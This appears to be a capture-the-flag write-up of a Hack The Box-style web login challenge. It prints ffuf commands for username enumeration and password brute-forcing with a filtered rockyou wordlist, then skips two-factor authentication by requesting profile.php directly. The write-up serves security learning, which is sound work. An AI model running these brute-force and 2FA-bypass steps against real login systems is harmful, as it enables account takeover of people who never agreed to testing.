# Background:

SecureMint Innovations has hired us to test their new authentication mechganism of their web application.

Ome of the updates is a new password policy that was designed to improve account security.



# Recon:

Reconnaissance is straightforward, simply go to the login page:

	http://154.57.164.82:30826/login.php


Lets try the default credentials:

	Username: admin
	Password: admin



- This didn't work, we got the error message:

		Unknown username or password.


Notice the option: "Register a new account"

- If you follow the link and attempt, and fail to create an account the site will provide us with valuable information regarding the account passwords:



	- The site employs several useful password restrictions, although requiring a password lenght to be exactly 12 characters would make brute forcing significantly easier.




# Attack:

Let's start by creating an account:

	Username: admin
	Password: Playstation3


If we go back to the login, lets see what happens if we login with the wrong password:

	$ ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "http://154.57.164.82:30639/login.php" -d "username=FUZZ&password=Playstation1" -fr "Unknown username or password." -fc 403 -w /usr/share/seclists/Usernames/Names/names.txt
	...
	admin                   [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 224ms]
	gladys                  [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 188ms]


- We've found a username! Now lets see if we can brute force their password.


First, well simplify the rockyou wordlist to fit the password restrictions:

	$ cat /tmp/rockyou.txt | grep '[[:upper:]]' | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -v '[[:punct:]]' | grep -x '.\{12\}' | > rockyou.txt


Now we'll use our custom wordlist to brute force gladys' password:

	$ ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -u "http://154.57.164.73:31686/login.php" -d "username=gladys&password=FUZZ" -fr "Invalid credentials." -fc 403 -w rockyou.txt 
	...
	dWinaldasD13            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 161ms]


If we login with the credentials, gladys dWinaldasD13, then we will be prompted with a 2 factor authentication page. And if we get the code wrong 3 times we'll be prompted to login again, which makes brute forcing with ffuf impractical. So lets see if we can circumvent this.

Lets move to Burp Suite an inspect the request that succeeds the login request.

	GET /2fa.php HTTP/1.1

- Its a GET request that is sending us to the 2fa page.


Recall that if we logged in with the account we created, it takes us to profile.php.

- What happens if modify the request to tell the server to go to profile.php?

		GET /profile.php HTTP/1.1


Well the responce shows that we were able to bypass the authentication and login as gladys, and that the flag is located in the html:

	<div class="heading">
		  <h1 class="display-5 title">Welcome gladys!</h1>
		  <br />
		  <div class="cards">

		    HTB{d86115e037388d0fa29280b737fd9171}
	</div>
	</div>


Additionally, we can use curl to get the flag:

	$ curl -s "http://154.57.164.82:31187/profile.php" \
		-H "Cookie: PHPSESSID=3vimg474018c8e8qa4cea7bape" \
		-d "username=gladys&password=dWinaldasD13"

- Which the server responds with:

		<div class="heading">
				<h1 class="display-5 title">Welcome gladys!</h1>
				<br />
				<div class="cards">

				  HTB{d86115e037388d0fa29280b737fd9171}
		</div>
		</div>

